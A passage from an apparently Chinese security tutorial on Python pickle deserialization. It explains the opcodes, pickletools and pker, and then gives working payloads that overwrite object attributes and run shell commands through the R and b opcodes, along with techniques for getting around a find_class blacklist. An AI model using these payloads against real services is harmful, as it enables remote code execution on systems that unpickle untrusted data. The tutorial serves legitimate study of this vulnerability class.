<span class="n">BINUNICODE8</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8d</span><span class="s1">'</span>  <span class="c1">#先读取8字节数据然后通过unpack使用&lt;Q格式解压数据,将得到的结果作为大小向后读取相应字节数,然后将读取到的数据使用utf-8格式解压为字符串,将字符串压栈b'\x8d\x06\x00\x00\x00\x00\x00\x00\x00h0cksr.' =&gt; h0cksr</span>
<span class="n">BINBYTES8</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8e</span><span class="s1">'</span>  <span class="c1">#同上读取8字节数据&lt;Q格式解压,然后读取数据,但是直接将比特流数据压栈而不会解码b'\x8e\x06\x00\x00\x00\x00\x00\x00\x00S1nKk.' =&gt; b'S1nKk'</span>
<span class="n">EMPTY_SET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8f</span><span class="s1">'</span>  <span class="c1">#向栈中压入一个set类型的空集合(set()没有指定iterable的时候返回的是一个空集合)</span>
<span class="n">ADDITEMS</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span>  <span class="c1">#先pop弹出一个元素作为items,记栈顶元素为top,然后检查top是否为set类型,如果是的话就执行top.update(items),如果top不是set类型那就使用for遍历items,逐个执行top.add(item)</span>
<span class="n">FROZENSET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x91</span><span class="s1">'</span>  <span class="c1">#弹出栈顶元素作为items,然后执行frozenset(items)生成一个frozenset类型的变量,并将这个变量压栈</span>
<span class="n">NEWOBJ_EX</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x92</span><span class="s1">'</span><span class="c1">#(这个很有用)  #和NEWOBJ差不多,先从栈中弹出三个元素,第一个,第二个,第三个弹出的元素分别记为var1,var2,var3,然后执行cls.__new__(var3, *var2, **var1)之后将执行生成的对象压栈</span>
<span class="n">STACK_GLOBAL</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x93</span><span class="s1">'</span><span class="c1">#(这个很有用)  #和GLOBAL操作一样但是导入的模块从栈上获取,先弹出一个元素为name,然后再弹出一个元素moudle,要求两个元素都必须是字符串类型,然后到处moudle.name,在将导出的内容压栈b"S'os'\nS'system'\n\x93." =&gt; os.system</span>
<span class="n">MEMOIZE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x94</span><span class="s1">'</span>  <span class="c1">#将当前栈顶元素添加到缓存列表的末尾(注意栈顶不会弹出)</span>
<span class="n">FRAME</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x95</span><span class="s1">'</span>  <span class="c1">#后面先是读取8字节数据通过unpack使用&lt;Q格式将数据解压得到的结果作为大小,向后读取对应字节的数据,然后将读取到的数据进行正常pickle反序列化(感觉用不用这个操作没啥差别,但是细节差别的话看源码)</span>
</pre></div>
<p>爱来自h0cksr师傅</p>
<h4 data-content="1" id="868b7d176a90e75f96d1e40bf2cea10d">pickletools的使用</h4>
<p>pickletools是python的一个内建模块,常用的方法有<code>pickletools.dis()</code>,用于把一段opcode转换为易读的形式,如</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickletools</span>

<span class="n">opcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'''c__main__</span>
<span class="s1">secret</span>
<span class="s1">(S'secret'</span>
<span class="s1">S'Hack!!!'</span>
<span class="s1">db.'''</span>

<span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</pre></div>
<p>输出</p>
<pre><code>0: c    GLOBAL     '__main__ secret'
   17: (    MARK
   18: S        STRING     'secret'
   28: S        STRING     'Hack!!!'
   39: d        DICT       (MARK at 17)
   40: b    BUILD
   41: .    STOP
highest protocol among opcodes = 0</code></pre>
<h4 data-content="1" id="309f664efac53b552ce38e0608c545bf">pker的使用</h4>
<p>pker是一个可以把python语言翻译成opcode的工具.</p>
<p>pker支持这三种操作</p>
<ul>
<li>变量赋值：<ul>
<li>左值可以是变量名，dict或list的item，对象成员</li>
<li>右值可以是基础类型字面量，函数调用</li>
</ul>
</li>
<li>函数调用</li>
<li>return：可返回0~1个参数</li>
</ul>
<p>pker内置了三个函数</p>
<pre><code>GLOBAL('os', 'system')             =&gt;  cos\nsystem\n
INST('os', 'system', 'ls')         =&gt;  (S'ls'\nios\nsystem\n
OBJ(GLOBAL('os', 'system'), 'ls')  =&gt;  (cos\nsystem\nS'ls'\no</code></pre>
<p>可以用return返回一个对象</p>
<pre><code>return           =&gt;  .
return var       =&gt;  g_\n.
return 1         =&gt;  I1\n.</code></pre>
<div class="highlight"><pre><span></span><span class="c1">#pker_test.py</span>

<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">s</span> <span class="o">=</span> <span class="s1">'id'</span>
<span class="n">lst</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span>
<span class="n">tpl</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,)</span>
<span class="n">dct</span> <span class="o">=</span> <span class="p">{</span><span class="n">tpl</span><span class="p">:</span> <span class="mi">0</span><span class="p">}</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">GLOBAL</span><span class="p">(</span><span class="s1">'os'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">)</span>
<span class="n">system</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
<span class="k">return</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="c1">#命令行下</span>

$ python3 pker.py &lt; pker_tests.py

b<span class="s2">"I0\np0\n0S'id'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR."</span>
</pre></div>
<h3 data-content="1" id="40f990338b7b234aeb39795dd89341c0">利用</h3>
<h4 data-content="1" id="56c8cf48e36e1a4204b1948c2809faea">变量覆盖</h4>
<p>假设存在类<code>Secret</code>,类有一个<code>name</code>属性,那我们可以通过pickle反序列化修改这个属性的值.</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">pickletools</span>
<span class="k">class</span> <span class="nc">Secret</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>

<span class="n">s</span><span class="o">=</span><span class="n">Secret</span><span class="p">(</span><span class="s2">"S1nKk"</span><span class="p">)</span>
<span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"""c__main__</span>
<span class="s2">s</span>
<span class="s2">(S'name'</span>
<span class="s2">S'Funny_M0nk3y'</span>
<span class="s2">db."""</span>
<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
<span class="c1"># pickletools.dis(opcode)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240308140150-5aca3616-dd11-1.png"/></p>
<p>成功输出<code>Funny_M0nk3y</code>,表示成功篡改属性</p>
<p>逐行解读一下opcode</p>
<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">=</span><span class="sa">b</span><span class="s2">"""c__main__</span>
<span class="s2">s#向栈中压入被实例化的s</span>
<span class="s2">(S'name'#压入一个MARK,再压入一个'name'字符串</span>
<span class="s2">S'Funny_M0n3ky'#压入一个ghd</span>
<span class="s2">db."""</span>
<span class="c1">#d操作符弹出'name'和ghd,压入一个字典{name:Funny_M0nk3y}</span>
<span class="c1">#b操作符弹出字典,并用字典中的键值对{name:Funny_M0nk3y}给s赋值(相当于执行了s的__init__),完成了篡改</span>
</pre></div>
<h4 data-content="1" id="1abce638113e9a00d0f0e05e004c26a6">RCE</h4>
<p>可以使用<code>R</code>,<code>i</code>,<code>o</code>,<code>b</code>等操作码实现命令执行.</p>
<h5 data-content="1" id="00a8baabc8a3c9703a830eba4aed1785">
<code>c</code>操作符</h5>
<p>先提一下用的最多的<code>c</code>操作符,其中<code>find_class()</code>函数很关键,在对危险函数的过滤和绕过中也会提到这个函数.</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_global</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">module</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span>
    <span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span><span class="c1">#获取moudle和name</span>
    <span class="n">klass</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span><span class="c1">#使用find_class()获取函数</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">klass</span><span class="p">)</span><span class="c1">#压栈</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="c1"># Subclasses may override this.</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">audit</span><span class="p">(</span><span class="s1">'pickle.find_class'</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proto</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">fix_imports</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="ow">in</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">NAME_MAPPING</span><span class="p">:</span>
            <span class="n">module</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">NAME_MAPPING</span><span class="p">[(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)]</span>
        <span class="k">elif</span> <span class="n">module</span> <span class="ow">in</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">IMPORT_MAPPING</span><span class="p">:</span>
            <span class="n">module</span> <span class="o">=</span> <span class="n">_compat_pickle</span><span class="o">.</span><span class="n">IMPORT_MAPPING</span><span class="p">[</span><span class="n">module</span><span class="p">]</span>
    <span class="nb">__import__</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">proto</span> <span class="o">&gt;=</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">_getattribute</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">],</span> <span class="n">name</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">],</span> <span class="n">name</span><span class="p">)</span>
</pre></div>
<p><code>c</code>操作符把<code>find_class()</code>函数返回的一个类对象压入栈,通过<code>__import__()</code>引入了模块并且通过<code>self.proto</code>判断pickle版本处理了不同版本的函数名称问题.</p>
<h5 data-content="1" id="58fa4e6e9e92715fa733dbdf042b0094">
<code>R</code>操作符</h5>
<p>源码</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_reduce</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span><span class="c1">#栈顶的元组出栈,把元组赋值给args</span>
    <span class="n">func</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="c1">#stack[-1]是出栈操作,索引值为-1代表最后一个进入列表的元素(反向索引)</span>
    <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span><span class="c1">#func出栈,func的返回值进栈</span>
    <span class="c1">#'*'操作符用作解包,把元组里的元素作为未知参数传递给func</span>
</pre></div>
<p>用R操作符构造的payload模板</p>
<div class="highlight"><pre><span></span><span class="n">c</span><span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">callable</span><span class="o">&gt;</span>
<span class="p">(</span><span class="o">&lt;</span><span class="n">args</span><span class="o">&gt;</span>
<span class="n">tR</span><span class="o">.</span>
</pre></div>
<p>e.g.</p>
<div class="highlight"><pre><span></span><span class="n">cos</span>
<span class="n">system</span> <span class="c1">#用c操作符引入os.system,也就是把os.system压入栈</span>
<span class="p">(</span><span class="n">S</span><span class="s1">'ls'</span> <span class="c1">#先把MARK压入栈,再把ls压入栈</span>
<span class="n">tR</span><span class="o">.</span> <span class="c1">#t操作符把ls出栈,元组(ls)入栈</span>
    <span class="c1">#R操作符把元组作为os.system的参数传入并执行</span>
<span class="o">&lt;=&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="s1">'ls'</span><span class="p">,))</span>
</pre></div>
<h5 data-content="1" id="3e9697453ee33faac2836a5e8ba191ff">
<code>o</code>操作符</h5>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_obj</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="c1"># Stack is ... markobject classobject arg1 arg2 ...</span>
    <span class="n">args</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pop_mark</span><span class="p">()</span>
    <span class="bp">cls</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">_instantiate</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
</pre></div>
<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
<h5 data-content="1" id="ab70c6d69bc5633a4c167e495acecd74">
<code>i</code>操作符</h5>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_inst</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
    <span class="n">module</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"ascii"</span><span class="p">)</span>
    <span class="n">name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"ascii"</span><span class="p">)</span>
    <span class="n">klass</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">_instantiate</span><span class="p">(</span><span class="n">klass</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">pop_mark</span><span class="p">())</span>
</pre></div>
<p>源码不是很容易懂,<code>i</code>像是<code>o</code>和<code>c</code>的结合,先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）.</p>
<h5 data-content="1" id="0e99caba4470113af28eee9c20654df9">
<code>b</code>操作符</h5>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">load_build</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">stack</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span>
        <span class="n">state</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
        <span class="c1"># 首先获取栈上的字节码 b 前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span>
        <span class="n">inst</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="c1">#获取该字典中键名为"__setstate__"的value</span>
        <span class="n">setstate</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="s2">"__setstate__"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="c1">#如果存在，则执行value(state)</span>
        <span class="k">if</span> <span class="n">setstate</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">setstate</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="n">slotstate</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
            <span class="n">state</span><span class="p">,</span> <span class="n">slotstate</span> <span class="o">=</span> <span class="n">state</span>
        <span class="c1">#如果"__setstate__"为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span>
        <span class="k">if</span> <span class="n">state</span><span class="p">:</span><span class="c1">#如果state不是False,None,0或者非空序列,就步入</span>
            <span class="n">inst_dict</span> <span class="o">=</span> <span class="n">inst</span><span class="o">.</span><span class="vm">__dict__</span>
            <span class="nb">intern</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">intern</span>
            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">state</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">:</span>
                    <span class="n">inst_dict</span><span class="p">[</span><span class="nb">intern</span><span class="p">(</span><span class="n">k</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">inst_dict</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
        <span class="c1">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span>
        <span class="k">if</span> <span class="n">slotstate</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">slotstate</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                <span class="nb">setattr</span><span class="p">(</span><span class="n">inst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
    <span class="n">dispatch</span><span class="p">[</span><span class="n">BUILD</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">load_build</span>
</pre></div>
<p>简单地说,<code>b</code>操作符有两种用法</p>
<ol>
<li>向一个实例中插入属性,或覆盖属性</li>
<li>以一个实例的<code>__setstate__</code>属性为<code>func</code>,<code>b</code>的前一个元素当作<code>arg</code>,执行<code>func(arg)</code>
</li>
</ol>
<p><code>b</code>操作符的工作方式:</p>
<ol>
<li>弹栈,此元素为<code>state</code>.</li>
<li>取栈顶元素,此元素为<code>setstate</code>.此元素可以是一个实例,也可以是一个字典.如果是一个实例,那么会尝试获取这个实例的<code>__setstate__</code>属性的值.</li>
<li>如果<code>__setstate__</code>存在,那么执行<code>setstate(state)</code>.</li>
<li>如果<code>__setstate__</code>不存在,判断<code>state</code>的类型.如果是元组,并且元组中只有两个元素,那么就按顺序给<code>state</code>和<code>slotstate</code>赋元组中的元素,然后根据<code>state</code>字典中的键值对给<code>inst.__dict__</code>更新属性的值.如果<code>slotstate</code>是一个字典,那么也根据<code>slotstate</code>的键值对给<code>inst</code>更新属性的值.</li>
<li>如果不是元组,那么就根据<code>state</code>字典中的值更新<code>inst.__dict__</code>的值.</li>
</ol>
<p>因为存在</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="n">setstate</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">setstate</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
            <span class="k">return</span>
</pre></div>
<p>这一功能,那么<code>b</code>操作符理所当然地可以用来进行命令执行.</p>
<p><code>b</code>操作符的使用模板</p>
<pre><code>b'c__main__\ns1nk\n)\x81}X\x0C\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.'</code></pre>
<p>用pickletools看一下过程.</p>
<div class="highlight"><pre><span></span><span class="mi">0</span><span class="p">:</span> <span class="n">c</span>    <span class="n">GLOBAL</span>     <span class="s1">'__main__ s1nk'</span> <span class="c1">#引入一个模块</span>
   <span class="mi">15</span><span class="p">:</span> <span class="p">)</span>    <span class="n">EMPTY_TUPLE</span>   <span class="c1">#压入一个空元组</span>
   <span class="mi">16</span><span class="p">:</span> \<span class="n">x81</span> <span class="n">NEWOBJ</span>        <span class="c1">#创建一个c引入模块的实例,并以元组作为传入的元素</span>
   <span class="mi">17</span><span class="p">:</span> <span class="p">}</span>    <span class="n">EMPTY_DICT</span>    <span class="c1">#压入一个空字典</span>
   <span class="mi">18</span><span class="p">:</span> <span class="n">X</span>    <span class="n">BINUNICODE</span> <span class="s1">'__setstate__'</span>  <span class="c1">#压入一个字符串"__setstate__”</span>
   <span class="mi">35</span><span class="p">:</span> <span class="n">c</span>    <span class="n">GLOBAL</span>     <span class="s1">'os system'</span>     <span class="c1">#压入一个os.system模块</span>
   <span class="mi">46</span><span class="p">:</span> <span class="n">s</span>    <span class="n">SETITEM</span>                    <span class="c1">#弹出两个元素,分别作为value和key,再取当前栈顶元素为dict,dict[key]=value</span>
   <span class="mi">47</span><span class="p">:</span> <span class="n">b</span>    <span class="n">BUILD</span>                      <span class="c1">#实例没有__setstate__属性,那么就把字典的键值对赋给实例</span>
   <span class="mi">48</span><span class="p">:</span> <span class="n">X</span>    <span class="n">BINUNICODE</span> <span class="s1">'whoami'</span>        <span class="c1">#压入字符串"whoami”</span>
   <span class="mi">59</span><span class="p">:</span> <span class="n">b</span>    <span class="n">BUILD</span>                      <span class="c1">#实例有__setstate__属性,执行了os.system(whoami)</span>
   <span class="mi">60</span><span class="p">:</span> <span class="o">.</span>    <span class="n">STOP</span>
<span class="n">highest</span> <span class="n">protocol</span> <span class="n">among</span> <span class="n">opcodes</span> <span class="o">=</span> <span class="mi">2</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">c__main__</span>
<span class="n">name</span>
<span class="p">}(</span><span class="n">S</span><span class="s2">"__setstate__"</span>    <span class="c1"># } 压入空dict __setstate__，然后 c push进去我们的 os.system</span>
<span class="n">cos</span>
<span class="n">system</span>
<span class="n">ubS</span><span class="s2">"calc"</span>  <span class="c1"># 执行第一次 b ，因为现在并没有 b ，所以执行 __dict__.update，也就是将我们前面的 {"__setstate__":os.system} 压入栈</span>
<span class="n">b</span><span class="o">.</span>         <span class="c1"># 再次执行 b 由于已经有了__setstate__，所以会将栈中字节码 b 的前一个元素当作 state，执行__setstate__(state)，</span>
</pre></div>
<p>这个payload看似是可行的,但是具体运行时会报错<code>TypeError: 'mappingproxy' object does not support item assignment</code>.</p>
<p>在Python中,使用<code>class.__dict__</code>调用一个类的属性会返回一个不可变字典(mappingproxy),如果对这个字典进行更新就会报错.那么第一个payload为什么能用呢??</p>
<blockquote>
<p>所有实例属性都存储在 <strong>dict</strong> 字典中，这就是一个常规的 dict，对于实例属性的维护即是从该字典中获取和修改</p>
<p>类属性使用的字典是一个 MappingProxyType 对象，它是一个不能 setattr 的字典。这意味着它对开发者是只读的.</p>
</blockquote>
<p>也就是说,我们只能修改一个实例的<code>inst.__dict__</code>,而不能修改一个类的<code>class.__dict__</code>.</p>
<p>重点关注<code>\x81</code>这个操作符.这个payload通过<code>\x81</code>操作符对<code>c</code>引入的<code>__main__.s1nk</code>实例化,进而实现了对<code>__main__.s1nk</code>一个实例的属性的修改.</p>
<h3 data-content="1" id="62fe4361df01e66da8cc9d2ed3f4be2f">绕过</h3>
<h4 data-content="1" id="ff3a51125fd8c6059c4fed1b65dba7c3">重写<code>find_class()</code>的</h4>
<h5 data-content="1" id="893960df63f9006bf394471c0ac067a1">思路一 获取危险函数</h5>
<p>Python是一门<strong>面向对象属性很重的</strong>语言.也就是说在Python中几乎一切皆为对象.这也为我们的绕过提供的不小的便利.</p>
<p>比如这样重写</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">builtins</span>

<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'exec'</span><span class="p">,</span> <span class="s1">'execfile'</span><span class="p">,</span> <span class="s1">'compile'</span><span class="p">,</span> <span class="s1">'open'</span><span class="p">,</span> <span class="s1">'input'</span><span class="p">,</span> <span class="s1">'__import__'</span><span class="p">,</span> <span class="s1">'exit'</span><span class="p">}</span>


    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="c1"># Only allow safe classes from builtins.</span>
        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">"builtins"</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="c1"># Forbid everything else.</span>
        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">"global '</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">' is forbidden"</span> <span class="o">%</span>
                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">restricted_loads</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="sd">"""Helper function analogous to pickle.loads()."""</span>
    <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
</pre></div>
<p>这种过滤终究是针对了<code>find_class()</code>函数,只要我们在使用<code>c</code>操作符和<code>i</code>时不违反规定即可.在本题中是不能通过<code>find_class()</code>函数调用黑名单中的函数.</p>
<p>和SSTI和沙箱逃逸的思路类似,可以通过构造类对象链调用某些方法中含有危险函数的类实现绕过.我们只需要构造形如<code>builtins.getattr(builtins,"eval")(command)</code>的payload即可实现绕过.在pickle反序列化中的一个难点就是如何用opcode表示出我们需要的命令.</p>
<h6 data-content="1" id="afa4849047c54f9649278b115fc004d8">利用<code>sys.module</code>获取危险函数</h6>
<p><code>sys.module</code>是一个全局字典,其主要用于存储已经被加载到当前会话中的你快.这个知识点会在学习沙箱逃逸的时候重点学习.<code>sys.modules</code>这个字典的键是模块名,值是模块本身.所以我们可以通过<code>get(sys.modules,"moduleName")</code>的方法获取危险模块.</p>
<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span>
